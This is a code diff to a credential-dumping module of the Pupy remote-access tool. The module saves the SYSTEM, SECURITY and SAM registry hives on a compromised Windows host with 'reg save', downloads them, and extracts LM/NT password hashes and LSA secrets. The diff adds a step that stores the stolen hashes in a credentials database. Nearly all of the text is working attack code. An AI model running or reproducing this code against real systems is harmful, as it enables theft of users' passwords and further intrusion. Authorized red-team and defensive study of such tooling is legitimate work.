@@ -15,7 +15,7 @@
 
 from pupylib.PupyModule import *
 from pupylib.PupyCompleter import *
-
+from pupylib.utils.credentials import Credentials
 from modules.lib.utils.shell_exec import shell_exec
 
 from rpyc.utils.classic import download
@@ -55,7 +55,7 @@ class CredDump(PupyModule):
         for cmd in ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM /y", "reg save HKLM\\SECURITY %TEMP%/SECURITY /y", "reg save HKLM\\SAM %TEMP%/SAM /y"):
             self.info("running %s..." % cmd)
             self.log(shell_exec(self.client, cmd))
-        self.success("hives saved!")            
+        self.success("hives saved!")
         remote_temp=self.client.conn.modules['os.path'].expandvars("%TEMP%")
         
         self.info("downloading SYSTEM hive...")
@@ -107,11 +107,17 @@ class CredDump(PupyModule):
         self.success("dumping LM and NT hashes...")
         bootkey = get_bootkey(sysaddr)
         hbootkey = get_hbootkey(samaddr,bootkey)
+        hashes = []
         for user in get_user_keys(samaddr):
             lmhash, nthash = get_user_hashes(user,hbootkey)
             if not lmhash: lmhash = empty_lm
             if not nthash: nthash = empty_nt
             self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
+            hashes.append({'hashes': "%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')), 'Tool': 'Creddump'})
+        
+        db = Credentials()
+        db.add(hashes)
+        self.success("Hashes stored on the database")
         
         self.success("dumping lsa secrets...")
         secrets = get_file_secrets(os.path.join(rep, "SYSTEM"), os.path.join(rep, "SECURITY"), is_vista)
